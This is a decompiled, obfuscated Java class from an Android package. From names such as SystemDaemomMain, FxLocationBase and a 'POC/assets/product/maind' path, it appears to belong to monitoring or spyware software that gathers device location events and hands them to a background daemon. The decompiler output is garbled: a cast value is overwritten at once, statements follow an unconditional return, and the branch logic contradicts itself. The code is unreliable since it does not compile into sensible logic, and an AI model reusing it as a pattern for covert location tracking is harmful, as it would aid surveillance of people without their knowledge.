package com.fx.psysd;

import com.vvt.base.FxEvent;
import com.vvt.base.a;
import com.vvt.events.FxLocationBase;
import java.util.List;

class c
  implements a
{
  c(SystemDaemomMain paramSystemDaemomMain, int paramInt) {}
  
  public void a(List paramList)
  {
    int i = 0;
    Object localObject = this.b;
    boolean bool1 = SystemDaemomMain.a((SystemDaemomMain)localObject);
    boolean bool2;
    if ((!bool1) || (paramList != null))
    {
      bool1 = paramList.isEmpty();
      if (!bool1) {}
    }
    else
    {
      bool1 = true;
      bool2 = bool1;
    }
    for (;;)
    {
      if (!bool2)
      {
        localObject = (FxEvent)paramList.get(0);
        boolean bool3 = localObject instanceof FxEvent;
        if (bool3)
        {
          localObject = (FxLocationBase)localObject;
          localObject = this.b;
          bool1 = SystemDaemomMain.a((SystemDaemomMain)localObject);
          if (!bool1) {}
        }
      }
      if (!bool2)
      {
        localObject = (FxEvent)paramList.get(0);
        localSystemDaemomMain = this.b;
        i = this.a;
        SystemDaemomMain.a(localSystemDaemomMain, (FxEvent)localObject, i);
      }
      localObject = this.b;
      bool1 = SystemDaemomMain.a((SystemDaemomMain)localObject);
      if (bool1) {}
      return;
      bool2 = false;
      SystemDaemomMain localSystemDaemomMain = null;
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/fx/psysd/MyUncaughtExceptionHandler.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */